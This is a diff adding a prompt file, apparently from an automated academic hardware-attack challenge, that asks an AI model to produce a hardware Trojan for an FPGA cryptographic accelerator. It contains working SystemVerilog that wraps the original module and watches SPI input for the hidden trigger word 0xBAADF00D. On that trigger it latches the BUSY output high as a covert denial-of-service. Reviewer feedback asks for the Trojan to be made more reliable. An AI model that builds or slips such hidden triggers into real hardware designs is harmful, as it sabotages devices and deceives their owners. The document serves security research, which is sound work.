@@ -1,0 +1,93 @@
+Model: @vertexai/gemini-3.1-pro-preview
+
+
+Context: CSAW 2026 AI Hardware Attack Challenge, an authorized academic
+FPGA security experiment using a provided, local simulation target.
+Generate a candidate SystemVerilog hardware modification.
+
+Original module recovered has ports:
+pin_36=SCK, pin_25=ENC_DEC, pin_28=NORM_CS_N, pin_32=MOSI,
+pin_34=RST_N, pin_27=START, pin_38=BUSY, pin_23=ICE_LED, pin_31=MISO.
+
+Return exactly ONE SystemVerilog code block containing ONE module called
+recovered. Instantiate recovered_original, connecting the ORIGINAL pin_*
+port names; NEVER redefine recovered_original.
+Preserve the original cryptographic datapath and all untriggered outputs.
+SPI transactions are MSB-first, 32 bits, NORM_CS_N=0, START=0.
+START is asserted separately with NORM_CS_N=1.
+Reset is synchronous active-low. Do not claim functional verification.
+
+Variant: dos
+Specification:
+Trigger: receive a complete 32-bit SPI word 0xBAADF00D while NORM_CS_N is low.
+Payload: latch externally visible BUSY high until synchronous reset. Preserve the core internally.
+
+Verified key evidence (if applicable): 
+
+Prior RTL (empty for first attempt):
+module recovered (
+    input  logic pin_36, // SCK
+    input  logic pin_25, // ENC_DEC
+    input  logic pin_28, // NORM_CS_N
+    input  logic pin_32, // MOSI
+    input  logic pin_34, // RST_N
+    input  logic pin_27, // START
+    output logic pin_38, // BUSY
+    output logic pin_23, // ICE_LED
+    output logic pin_31  // MISO
+);
+
+    logic orig_busy;
+
+    // Instantiate the original module, preserving its internal functionality
+    recovered_original recovered_original_inst (
+        .pin_36(pin_36),
+        .pin_25(pin_25),
+        .pin_28(pin_28),
+        .pin_32(pin_32),
+        .pin_34(pin_34),
+        .pin_27(pin_27),
+        .pin_38(orig_busy),
+        .pin_23(pin_23),
+        .pin_31(pin_31)
+    );
+
+    logic [31:0] shift_reg;
+    logic [5:0]  bit_cnt;
+    logic        trigger;
+
+    // Asynchronous reset on CS high to handle gapped SCK when CS is inactive
+    always_ff @(posedge pin_36 or posedge pin_28) begin
+        if (pin_28) begin
+            bit_cnt <= 6'd0;
+        end else begin
+            bit_cnt <= bit_cnt + 6'd1;
+        end
+    end
+
+    // MSB-first SPI shift register
+    always_ff @(posedge pin_36) begin
+        if (!pin_28) begin
+            shift_reg <= {shift_reg[30:0], pin_32};
+        end
+    end
+
+    // Trigger detection and synchronous reset payload latch
+    always_ff @(posedge pin_36) begin
+        if (!pin_34) begin
+            trigger <= 1'b0;
+        end else if (!pin_28 && (bit_cnt == 6'd31) && ({shift_reg[30:0], pin_32} == 32'hBAADF00D)) begin
+            trigger <= 1'b1;
+        end
+    end
+
+    // DoS Payload: Latch BUSY high externally
+    assign pin_38 = orig_busy | trigger;
+
+endmodule
+
+
+Feedback to address:
+The trigger word comparison and BUSY latch are correct. Improve reset handling so the SPI bit counter is initialized reliably by the accelerator's active-low reset as well as transaction boundaries. Ensure interrupted SPI transactions cannot accidentally trigger the payload. Keep ICE_LED consistent with BUSY during the triggered state. Preserve the recovered_original module and package-pin connections.
+
+Output only the complete recovered module in a ```systemverilog block.
